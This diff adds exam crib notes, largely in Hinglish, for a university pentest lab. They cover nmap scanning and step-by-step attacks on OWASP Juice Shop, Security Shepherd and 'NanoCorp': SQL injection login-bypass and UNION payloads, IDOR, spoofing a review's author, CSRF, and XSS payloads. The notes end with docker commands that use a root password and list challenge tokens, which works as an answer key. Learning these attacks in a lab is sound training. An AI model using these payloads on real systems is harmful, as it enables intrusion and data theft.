@@ -1,0 +1,305 @@
+________________________________________
+⭐ STEP 0 : PORT NUMBER KAISE NIKALEGA?
+Example network:
+192.168.139.0/24
+1. Live Hosts Find Karo
+nmap -sn 192.168.139.0/24
+Output example:
+192.168.139.47
+192.168.139.113
+192.168.139.178
+Yehi 3 vulnerable machines hain.
+Note: Kali aur tumhara laptop bhi list mein dikhenge. Sirf unknown hosts target hain.
+________________________________________
+2. Port Number Nikaalo
+Har discovered IP pe scan karo:
+Target 1
+nmap -p- 192.168.139.47
+Output:
+PORT      STATE SERVICE
+21127/tcp open  unknown
+Matlab:
+IP   = 192.168.139.47
+PORT = 21127
+Browser mein:
+http://192.168.139.47:21127
+________________________________________
+Target 2
+nmap -p- 192.168.139.113
+Output:
+53699/tcp open unknown
+Browser:
+http://192.168.139.113:53699
+________________________________________
+Target 3
+nmap -p- 192.168.139.178
+Output:
+38476/tcp open unknown
+Browser:
+http://192.168.139.178:38476
+________________________________________
+Agar nmap -p- Slow Lage
+Fast scan:
+nmap -Pn -T4 -p- <IP>
+Example:
+nmap -Pn -T4 -p- 192.168.139.178
+________________________________________
+Kaise Pata Chalega Kaunsa Juice Shop Hai?
+Browser mein khol ke dekho:
+Juice Shop
+URL:
+http://IP:PORT
+Page pe dikhega:
+OWASP Juice Shop
+Orange theme, products, search bar.
+________________________________________
+Shepherd
+Page pe dikhega:
+Shepherd
+Ya lessons/challenges listed honge.
+________________________________________
+NanoCorp
+NanoCorp branding dikh jayegi:
+NanoCorp
+Orders
+Reviews
+Products
+________________________________________
+Exam Flow (Sabse Pehle Yeh Karna)
+nmap -sn 192.168.139.0/24
+↓
+3 target IP note karo
+↓
+nmap -p- <IP1>
+nmap -p- <IP2>
+nmap -p- <IP3>
+↓
+Browser mein open karo
+↓
+Identify:
+Juice Shop / Shepherd / NanoCorp
+↓
+Phir exploits start karo
+________________________________________
+Short Memory Trick
+Exam mein sequence yaad rakhne ke liye:
+SN → P- → Browser → Identify → Exploit
+Matlab:
+Host Scan → Port Scan → Open Website → Identify Target → Solve Challenges
+Since this is an isolated university lab/CTF-style environment, you can organize your notes like this so that execution during the exam becomes much easier.
+________________________________________
+Penetration Testing & Secure Systems Lab – Quick Notes
+Target 1: OWASP Juice Shop (6 Challenges)
+________________________________________
+1. Sensitive Data Exposure (A01/A05)
+Goal: Access a confidential file that should not be publicly reachable.
+Steps
+1.	Open the application:
+2.	http://<IP>:<PORT>
+3.	Browse to:
+4.	/ftp/acquisitions.md
+5.	Example:
+6.	http://192.168.x.x:38476/ftp/acquisitions.md
+What to remember
+•	Juice Shop exposes files under /ftp.
+•	This challenge tests directory/static file exposure.
+•	If the file loads in the browser, the challenge is complete.
+________________________________________
+2. Security Misconfiguration (A05)
+Goal: Access the application's metrics endpoint without authentication.
+Steps
+Visit:
+http://<IP>:<PORT>/metrics
+Example:
+http://192.168.x.x:38476/metrics
+Notes
+•	Prometheus metrics are often accidentally exposed.
+•	No login is required.
+•	Simply opening the page usually solves the challenge.
+________________________________________
+3. SQL Injection – Login Bypass (A03)
+
+Goal: Log in as administrator.
+Payload
+Username:
+' OR TRUE--
+Password:
+1234
+Explanation
+Backend query becomes similar to:
+SELECT *
+FROM Users
+WHERE email='' OR TRUE--'
+AND password='1234';
+Because:
+OR TRUE
+always evaluates to true, authentication is bypassed.
+Notes
+•	Try administrator login page.
+•	-- comments out the remaining query.
+________________________________________
+4. Broken Access Control – IDOR (A01)
+Goal: View another user's basket.
+Steps
+1.	Add any item to basket.
+2.	Open Developer Tools.
+3.	F12
+4.	Go to:
+5.	Application
+6.	→ Session Storage
+7.	→ localhost
+8.	Locate basket-related key/value.
+9.	Change basket ID.
+Example:
+BasketId: 3
+↓
+BasketId: 2
+6.	Press Enter and refresh.
+Notes
+•	IDOR = Insecure Direct Object Reference.
+•	You're changing the object identifier directly.
+________________________________________
+5. UNION SQL Injection (A03)
+Goal: Extract database schema.
+Payload
+/rest/products/search?q=qwert')) UNION SELECT 1,2,3,sql,5,6,7,8,9 FROM sqlite_master--
+Example:
+http://<IP>:<PORT>/rest/products/search?q=qwert'))%20UNION%20SELECT%201,2,3,sql,5,6,7,8,9%20FROM%20sqlite_master--
+Explanation
+sqlite_master stores:
+•	table names
+•	schema definitions
+•	CREATE TABLE statements
+The column:
+sql
+reveals database structure.
+Notes
+•	Ensure column count matches.
+•	Juice Shop uses SQLite.
+________________________________________
+6. Broken Access Control – Submit Review as Another User
+Goal: Post review using another user's identity.
+Steps
+1.	Open any product.
+2.	Click:
+3.	Add Review
+4.	Press:
+5.	F12
+6.	Go to:
+7.	Network
+8.	Submit review.
+9.	Find request returning:
+10.	HTTP 201 PUT
+11.	Right-click.
+12.	Copy
+13.	→ Copy as Fetch
+14.	Open Console.
+15.	Paste fetch request.
+16.	Modify:
+"author":"victim@gmail.com"
+11.	Execute.
+Notes
+•	Server trusts client-provided author field.
+•	Review gets attributed to another user.
+________________________________________
+Target 2: Shepherd
+________________________________________
+1. CSRF
+Goal
+Trigger CSRF lesson completion.
+________________________________________
+Step 1
+Start listener/server.
+Example:
+http://192.168.20.113:30221
+________________________________________
+Step 2
+Use endpoint shown on page:
+GET /root/grantComplete/csrfLesson?userId=exampleId
+Replace:
+exampleId
+with actual ID displayed.
+Example:
+http://192.168.20.113:30221/root/grantComplete/csrfLesson?userId=1920245357
+Notes
+•	CSRF exploits authenticated users.
+•	User ID is usually displayed somewhere in lesson instructions.
+________________________________________
+2. SQL Injection
+Payload:
+" OR 1=1 --
+Explanation
+Makes condition always true.
+Example:
+WHERE username="" OR 1=1
+________________________________________
+3. Cross-Site Scripting (XSS)
+Payload:
+<img src=x onerror=alert(1)>
+Notes
+•	Invalid image causes onerror to execute.
+•	Useful when <script> tags are filtered.
+________________________________________
+Target 3: NanoCorp
+________________________________________
+1. Reflected XSS
+Payload:
+<script>alert('XSS')</script>
+If not working
+Try:
+<img src=x onerror=alert('XSS')>
+or
+<svg onload=alert('XSS')>
+Notes
+•	Reflected XSS executes immediately after submission.
+•	Depends heavily on filtering rules.
+________________________________________
+2. Stored XSS
+Payload:
+<img src="#" onerror="alert('XSS')">
+Alternative:
+<iframe src='#' onload='alert("XSS")'></iframe>
+Notes
+•	Payload is saved in database.
+•	Another user visiting page triggers execution.
+________________________________________
+3. IDOR
+Goal:
+View other users' orders.
+Steps
+Navigate to:
+/orders/1
+Example:
+http://<IP>:<PORT>/orders/1
+Change:
+1
+↓
+2
+↓
+3
+until another user's order appears.
+Notes
+•	Sequential IDs are common.
+•	Lack of authorization checks causes IDOR.
+________________________________________
+Extra Docker Commands
+________________________________________
+Show Databases
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "SHOW DATABASES;"
+________________________________________
+List Application Tables
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "
+SELECT table_schema, table_name
+FROM information_schema.tables
+WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys');"
+________________________________________
+SqlInjLesson Users
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "SELECT * FROM tb_users;"
+Challenge token:
+7f6bf34080979e0cebda5672e989c07ceec9fa4ee7b7c17c9e3ce26bc63e03c1
+________________________________________
+SqlChalOne Customers
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "SELECT * FROM customers;"
+Challenge token:
+fd8e9a29dab791197115b58061b215594211e72c1680f1eacc50b0394133a09f
+
